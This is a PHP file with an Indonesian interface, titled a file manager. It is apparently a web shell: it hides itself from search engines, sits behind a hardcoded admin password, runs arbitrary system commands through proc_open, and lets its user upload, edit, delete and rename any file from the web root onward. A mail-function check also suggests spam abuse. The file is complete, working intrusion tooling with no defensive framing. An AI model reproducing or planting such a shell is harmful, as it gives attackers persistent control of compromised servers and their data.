<!DOCTYPE html>
<html lang="id">
<head>
    <title>File Manager</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #f8f9fa;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
            background-color: #ffffff;
            border-radius: 10px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
        }
        .header h1 {
            font-size: 28px;
            text-align: center;
            margin-bottom: 20px;
            color: #343a40;
        }
        .subheader p {
            font-size: 16px;
            text-align: center;
            color: #6c757d;
            font-style: italic;
        }
        .result-box {
            width: 100%;
            height: 200px;
            padding: 10px;
            border: 1px solid #ced4da;
            border-radius: 5px;
            background-color: #f1f3f5;
            overflow: auto;
            font-family: 'Roboto', sans-serif;
            color: #343a40;
        }
        .result-box:focus {
            outline: none;
            border-color: #007bff;
        }
        .result-box::-webkit-scrollbar {
            width: 8px;
        }
        .result-box::-webkit-scrollbar-thumb {
            background-color: #007bff;
            border-radius: 4px;
        }
        form input[type="text"], form textarea, form select, form input[type="password"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ced4da;
            border-radius: 5px;
            font-family: 'Roboto', sans-serif;
        }
        form input[type="submit"], form input[type="file"] {
            padding: 10px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        form input[type="submit"]:hover {
            background-color: #0056b3;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }
        th, td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid #dee2e6;
        }
        th {
            background-color: #007bff;
            color: white;
        }
        tr:nth-child(even) {
            background-color: #f8f9fa;
        }
        .item-name {
            max-width: 300px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }
        .permission.writable {
            color: #28a745;
        }
        .permission.not-writable {
            color: #dc3545;
        }
        .login-container {
            max-width: 400px;
            margin: 50px auto;
        }
    </style>
</head>
<body>
<?php
session_start();

// Simulasi database pengguna dengan hash bcrypt
$users = [
    'admin' => '$2a$12$aAxMz/kVKimbh0NtK8LyuO1pyWgtqblCRFuYKNSSjWlqHO6i0dPMK' // Hash bcrypt untuk password
];

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login'])) {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';

    if (isset($users[$username]) && password_verify($password, $users[$username])) {
        $_SESSION['loggedin'] = true;
        $_SESSION['username'] = $username;
    } else {
        echo "<div class='alert alert-danger text-center'>Username atau password salah!</div>";
    }
}

if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
    ?>
    <div class="container login-container">
        <div class="header">
            <h1>Login File Manager</h1>
        </div>
        <form method="post" action="">
            <div class="mb-3">
                <label for="username" class="form-label">Username</label>
                <input type="text" name="username" id="username" class="form-control" required>
            </div>
            <div class="mb-3">
                <label for="password" class="form-label">Password</label>
                <input type="password" name="password" id="password" class="form-control" required>
            </div>
            <button type="submit" name="login" class="btn btn-primary w-100">Login</button>
        </form>
    </div>
    <?php
    exit;
}
?>

<div class="container">
    <div class="header">
        <h1>File Manager</h1>
        <p>Selamat datang, <?php echo htmlspecialchars($_SESSION['username']); ?> | <a href="?logout=true" class="text-danger">Logout</a></p>
    </div>
    <div class="subheader">
        <p>Kelola file dan folder dengan mudah</p>
    </div>

    <?php
    if (isset($_GET['logout'])) {
        session_destroy();
        header("Location: ?");
        exit;
    }

    date_default_timezone_set(date_default_timezone_get());
    $baseDirectory = realpath($_SERVER['DOCUMENT_ROOT']);
    $currentDirectory = realpath(isset($_GET['d']) ? base64_decode($_GET['d']) : $baseDirectory);
    chdir($currentDirectory);

    $viewCommandResult = '';

    function encode($str) {
        return base64_encode($str);
    }

    function decode($str) {
        return base64_decode($str);
    }

    // Check available functions
    $functions = [
        'mail' => function_exists('mail') ? '<span class="text-success">[ON]</span>' : '<span class="text-danger">[OFF]</span>',
        'mb_send_mail' => function_exists('mb_send_mail') ? '<span class="text-success">[ON]</span>' : '<span class="text-danger">[OFF]</span>',
        'error_log' => function_exists('error_log') ? '<span class="text-success">[ON]</span>' : '<span class="text-danger">[OFF]</span>',
        'imap_mail' => function_exists('imap_mail') ? '<span class="text-success">[ON]</span>' : '<span class="text-danger">[OFF]</span>',
    ];
    echo "<p>Status Fungsi: Mail {$functions['mail']}, MB Send Mail {$functions['mb_send_mail']}, Error Log {$functions['error_log']}, IMAP Mail {$functions['imap_mail']}</p>";

    if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_POST['login'])) {
        if (isset($_FILES['fileToUpload'])) {
            $target_file = $currentDirectory . '/' . basename($_FILES["fileToUpload"]["name"]);
            if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
                echo "<div class='alert alert-success'>File " . htmlspecialchars(basename($_FILES["fileToUpload"]["name"])) . " berhasil diunggah.</div>";
            } else {
                echo "<div class='alert alert-danger'>Maaf, terjadi kesalahan saat mengunggah file.</div>";
            }
        } elseif (isset($_POST['folder_name']) && !empty($_POST['folder_name'])) {
            $newFolder = $currentDirectory . '/' . $_POST['folder_name'];
            if (!file_exists($newFolder)) {
                if (mkdir($newFolder)) {
                    echo "<div class='alert alert-success'>Folder berhasil dibuat!</div>";
                } else {
                    echo "<div class='alert alert-danger'>Gagal membuat folder!</div>";
                }
            } else {
                echo "<div class='alert alert-danger'>Folder sudah ada!</div>";
            }
        } elseif (isset($_POST['file_name'])) {
            $fileName = $_POST['file_name'];
            $newFile = $currentDirectory . '/' . $fileName;
            if (!file_exists($newFile)) {
                if (file_put_contents($newFile, '') !== false) {
                    echo "<div class='alert alert-success'>File $fileName berhasil dibuat!</div>";
                    $fileToView = $newFile;
                    if (file_exists($fileToView)) {
                        $fileContent = file_get_contents($fileToView);
                        $viewCommandResult = "<div class='alert alert-info'>File: $fileName</div>
                        <form method='post' action='?".(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '')."'>
                        <textarea name='content' class='result-box'>" . htmlspecialchars($fileContent) . "</textarea>
                        <input type='hidden' name='edit_file' value='$fileName'>
                        <input type='submit' value='Simpan' class='btn btn-primary'></form>";
                    } else {
                        $viewCommandResult = "<div class='alert alert-danger'>File tidak ditemukan!</div>";
                    }
                } else {
                    echo "<div class='alert alert-danger'>Gagal membuat file!</div>";
                }
            } else {
                echo "<div class='alert alert-danger'>File sudah ada!</div>";
            }
        } elseif (isset($_POST['cmd_biasa'])) {
            $command = $_POST['cmd_biasa'];
            $descriptorspec = [
                0 => ['pipe', 'r'],
                1 => ['pipe', 'w'],
                2 => ['pipe', 'w']
            ];
            $process = proc_open($command, $descriptorspec, $pipes);
            if (is_resource($process)) {
                $output = stream_get_contents($pipes[1]);
                $errors = stream_get_contents($pipes[2]);
                fclose($pipes[1]);
                fclose($pipes[2]);
                proc_close($process);
                if (!empty($errors)) {
                    $viewCommandResult = "<div class='alert alert-danger'>Error:</div><textarea class='result-box'>" . htmlspecialchars($errors) . "</textarea>";
                } else {
                    $viewCommandResult = "<div class='alert alert-info'>Hasil:</div><textarea class='result-box'>" . htmlspecialchars($output) . "</textarea>";
                }
            } else {
                $viewCommandResult = "<div class='alert alert-danger'>Gagal menjalankan perintah!</div>";
            }
        } elseif (isset($_POST['view_file'])) {
            $fileToView = $currentDirectory . '/' . $_POST['view_file'];
            if (file_exists($fileToView)) {
                $fileContent = file_get_contents($fileToView);
                $viewCommandResult = "<div class='alert alert-info'>File: {$_POST['view_file']}</div>
                <form method='post' action='?".(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '')."'>
                <textarea name='content' class='result-box'>" . htmlspecialchars($fileContent) . "</textarea>
                <input type='hidden' name='edit_file' value='{$_POST['view_file']}'>
                <input type='submit' value='Simpan' class='btn btn-primary'></form>";
            } else {
                $viewCommandResult = "<div class='alert alert-danger'>File tidak ditemukan!</div>";
            }
        } elseif (isset($_POST['edit_file'])) {
            $ef = $currentDirectory . '/' . $_POST['edit_file'];
            $newContent = $_POST['content'];
            if (file_put_contents($ef, $newContent) !== false) {
                echo "<div class='alert alert-success'>File {$_POST['edit_file']} berhasil diedit!</div>";
            } else {
                echo "<div class='alert alert-danger'>Gagal mengedit file {$_POST['edit_file']}!</div>";
            }
        } elseif (isset($_POST['delete_file'])) {
            $fileToDelete = $currentDirectory . '/' . $_POST['delete_file'];
            if (file_exists($fileToDelete)) {
                if (is_dir($fileToDelete)) {
                    if (deleteDirectory($fileToDelete)) {
                        echo "<div class='alert alert-success'>Folder berhasil dihapus!</div>";
                    } else {
                        echo "<div class='alert alert-danger'>Gagal menghapus folder!</div>";
                    }
                } else {
                    if (unlink($fileToDelete)) {
                        echo "<div class='alert alert-success'>File berhasil dihapus!</div>";
                    } else {
                        echo "<div class='alert alert-danger'>Gagal menghapus file!</div>";
                    }
                }
            } else {
                echo "<div class='alert alert-danger'>File atau folder tidak ditemukan!</div>";
            }
        } elseif (isset($_POST['rename_item']) && isset($_POST['old_name']) && isset($_POST['new_name'])) {
            $oldName = $currentDirectory . '/' . $_POST['old_name'];
            $newName = $currentDirectory . '/' . $_POST['new_name'];
            if (file_exists($oldName)) {
                if (rename($oldName, $newName)) {
                    echo "<div class='alert alert-success'>Item berhasil diganti nama!</div>";
                } else {
                    echo "<div class='alert alert-danger'>Gagal mengganti nama item!</div>";
                }
            } else {
                echo "<div class='alert alert-danger'>Item tidak ditemukan!</div>";
            }
        }
    }

    echo '<hr><strong>Direktori Saat Ini:</strong> ';
    $directories = explode(DIRECTORY_SEPARATOR, $currentDirectory);
    $currentPath = '';
    foreach ($directories as $index => $dir) {
        if (!empty($dir)) {
            $currentPath .= DIRECTORY_SEPARATOR . $dir;
            echo "/<a href='?d=" . encode($currentPath) . "'>" . htmlspecialchars($dir) . "</a>";
        }
    }
    echo '<a href="?d=' . encode(dirname(__FILE__)) . '"> / <span class="text-success">[Kembali ke Beranda]</span></a>';
    echo '<hr>';

    echo '<form method="post" enctype="multipart/form-data" class="mb-3">
        <div class="input-group">
            <input type="file" name="fileToUpload" id="fileToUpload" class="form-control">
            <button type="submit" class="btn btn-primary">Unggah File</button>
        </div>
    </form>';

    echo '<div class="row">
        <div class="col-md-4">
            <form method="post" action="?' . (isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '') . '">
                <h5>Buat Folder</h5>
                <input type="text" name="folder_name" placeholder="Nama Folder" class="form-control">
                <button type="submit" class="btn btn-primary mt-2">Buat Folder</button>
            </form>
        </div>
        <div class="col-md-4">
            <form method="post" action="?' . (isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '') . '">
                <h5>Buat File</h5>
                <input type="text" name="file_name" placeholder="Nama File" class="form-control">
                <button type="submit" class="btn btn-primary mt-2">Buat File</button>
            </form>
        </div>
        <div class="col-md-4">
            <form method="post" action="?' . (isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '') . '">
                <h5>Jalankan Perintah</h5>
                <input type="text" name="cmd_biasa" placeholder="Masukkan perintah" class="form-control">
                <button type="submit" class="btn btn-primary mt-2">Jalankan</button>
            </form>
        </div>
    </div>';

    echo $viewCommandResult;

    echo '<table class="table table-bordered mt-4">
        <thead>
            <tr>
                <th>Nama Item</th>
                <th>Ukuran</th>
                <th>Tanggal</th>
                <th>Perizinan</th>
                <th>Lihat</th>
                <th>Hapus</th>
                <th>Ganti Nama</th>
            </tr>
        </thead>
        <tbody>';

    foreach (scandir($currentDirectory) as $v) {
        if ($v === '.' || $v === '..') continue;
        $u = realpath($v);
        $s = stat($u);
        $itemLink = is_dir($v) ? '?d=' . encode($currentDirectory . '/' . $v) : '?d=' . encode($currentDirectory) . '&f=' . encode($v);
        $permission = substr(sprintf('%o', fileperms($u)), -4);
        $writable = is_writable($u);
        echo "<tr>
            <td class='item-name'><a href='$itemLink'>" . htmlspecialchars($v) . "</a></td>
            <td>" . filesize($u) . "</td>
            <td>" . date('Y-m-d H:i:s', filemtime($u)) . "</td>
            <td class='permission " . ($writable ? 'writable' : 'not-writable') . "'>$permission</td>
            <td><form method='post' action='?" . (isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '') . "'><input type='hidden' name='view_file' value='" . htmlspecialchars($v) . "'><button type='submit' class='btn btn-sm btn-info'>Lihat</button></form></td>
            <td><form method='post' action='?" . (isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '') . "'><input type='hidden' name='delete_file' value='" . htmlspecialchars($v) . "'><button type='submit' class='btn btn-sm btn-danger'>Hapus</button></form></td>
            <td><form method='post' action='?" . (isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '') . "'><input type='hidden' name='old_name' value='" . htmlspecialchars($v) . "'><input type='text' name='new_name' placeholder='Nama Baru' class='form-control d-inline-block w-auto'><button type='submit' name='rename_item' class='btn btn-sm btn-warning'>Ganti Nama</button></form></td>
        </tr>";
    }

    echo '</tbody></table>';

    function deleteDirectory($dir) {
        if (!file_exists($dir)) {
            return true;
        }
        if (!is_dir($dir)) {
            return unlink($dir);
        }
        foreach (scandir($dir) as $item) {
            if ($item == '.' || $item == '..') {
                continue;
            }
            if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) {
                return false;
            }
        }
        return rmdir($dir);
    }
    ?>
</div>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
